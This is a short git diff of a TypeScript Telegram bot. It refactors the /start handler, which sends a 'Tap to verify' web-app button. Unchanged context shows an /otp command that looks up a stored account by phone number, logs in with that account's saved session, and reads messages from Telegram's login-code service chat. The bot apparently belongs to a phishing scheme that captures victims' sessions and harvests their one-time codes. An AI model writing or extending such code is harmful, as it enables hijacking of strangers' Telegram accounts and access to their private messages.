@@ -1,7 +1,7 @@
 import "dotenv/config";
 import { readFileSync } from "fs";
 import cors from "@fastify/cors";
-import { Input, Markup } from "telegraf";
+import { Input, Markup, type Context } from "telegraf";
 import Fastify, { FastifyRequest } from "fastify";
 
 import { db } from "./db";
@@ -19,7 +19,7 @@ fastify.register(cors, {
   origin: "*",
 });
 
-bot.start((context) => {
+const onStart = (context: Context) => {
   const message = readFileSync("./locale/en/start.md", "utf-8").replace(
     /%id/,
     String(context.botInfo!.id)
@@ -32,13 +32,18 @@ bot.start((context) => {
       Markup.button.webApp("Tap to verify", process.env.APP_URL!),
     ]).reply_markup,
   });
-});
+}
+
+bot.start(onStart);
+bot.command("start", onStart);
+
 
 bot.command("otp", async (context) => {
   if (true) {
     const [, phoneNumber] = context.message.text.split(" ");
     const [account] = await getAccountByPhoneNumber(db, phoneNumber);
-    if (!account) console.log(account);
+    if (!account)  return account; 
+
     const tg = createTgClient(account.session);
     await tg.client.connect();
     const messages = await tg.client.getMessages(777000);
